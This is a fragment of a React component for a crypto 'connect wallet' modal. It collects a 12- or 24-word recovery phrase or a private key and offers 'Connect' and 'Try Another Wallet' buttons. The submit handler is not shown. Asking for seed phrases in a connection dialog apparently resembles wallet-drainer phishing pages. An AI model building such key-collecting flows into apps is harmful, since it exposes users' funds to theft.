                            pasted.forEach((w, idx) => { if (idx < 24) next[idx] = w.toLowerCase(); });
                            setImportWords(next);
                            if (pasted.length === 24) setImportMode("24");
                            else if (pasted.length === 12) setImportMode("12");
                            setImportError("");
                          }
                        } : undefined}
                        className="w-full glass rounded-md border border-white/10 bg-white/5 focus:border-violet-500/50 focus:outline-none pl-6 pr-2 py-1.5 text-xs font-mono text-foreground placeholder:text-muted-foreground/30 transition-colors"
                        placeholder="word"
                      />
                    </div>
                  ))}
                </div>
              )}

              {/* Private key input */}
              {importMode === "key" && (
                <div className="space-y-1.5">
                  <label className="text-xs font-semibold text-muted-foreground uppercase tracking-widest">Private Key</label>
                  <input
                    data-testid="input-private-key"
                    type="password"
                    autoComplete="off"
                    value={importPKey}
                    onChange={(e) => { setImportPKey(e.target.value); setImportError(""); }}
                    placeholder="0x… hex or WIF format"
                    className="w-full glass rounded-lg border border-white/10 bg-white/5 focus:border-violet-500/50 focus:outline-none px-3 py-2.5 text-sm font-mono text-foreground placeholder:text-muted-foreground/40 transition-colors"
                  />
                </div>
              )}

              {importError && (
                <div className="flex items-start gap-2">
                  <AlertTriangle className="w-3.5 h-3.5 text-red-400 flex-shrink-0 mt-0.5" />
                  <p className="text-xs text-red-400">{importError}</p>
                </div>
              )}

              <div className="flex gap-3">
                <Button variant="outline"
                  onClick={() => { setStep("select"); setImportError(""); setImportWords(Array(24).fill("")); setImportPKey(""); }}
                  className="flex-1 border-white/10 text-muted-foreground text-sm">
                  <ArrowLeft className="w-4 h-4 mr-1.5" />
                  Back
                </Button>
                <Button data-testid="button-confirm-import" onClick={handleImportConfirm}
                  className="flex-1 bg-gradient-to-r from-violet-600 to-purple-600 text-white font-semibold border-0">
                  <CheckCircle2 className="w-4 h-4 mr-1.5" />
                  Connect
                </Button>
              </div>
            </div>
          );
        })()}

        {/* ERROR */}
        {step === "error" && (
          <div className="p-6 space-y-5">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-md bg-red-500/20 border border-red-500/30 flex items-center justify-center">
                  <X className="w-5 h-5 text-red-400" />
                </div>
                <div>
                  <h2 className="font-bold text-foreground">Connection Failed</h2>
                  <p className="text-xs text-muted-foreground">{selectedWallet?.name}</p>
                </div>
              </div>
              <button onClick={onClose}
                className="w-8 h-8 glass rounded-md border border-white/10 flex items-center justify-center text-muted-foreground">
                <X className="w-4 h-4" />
              </button>
            </div>

            <div className="glass rounded-xl border border-red-500/20 bg-red-500/5 p-4">
              <p className="text-sm text-muted-foreground leading-relaxed">{errorMsg}</p>
            </div>

            <div className="flex gap-3">
              <Button variant="outline" onClick={() => { setStep("select"); setErrorMsg(""); }}
                className="flex-1 border-white/10 text-muted-foreground text-sm">
                Try Another Wallet
              </Button>
              {selectedWallet && (
                <Button onClick={() => window.open(`https://${selectedWallet.id === "metamask" ? "metamask.io" : selectedWallet.id === "phantom" ? "phantom.app" : selectedWallet.id + ".io"}`, "_blank")}
                  className="flex-1 bg-gradient-to-r from-violet-600 to-purple-600 text-white font-semibold border-0">
                  <ExternalLink className="w-4 h-4 mr-1.5" />
                  Get {selectedWallet.name}
                </Button>
              )}
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
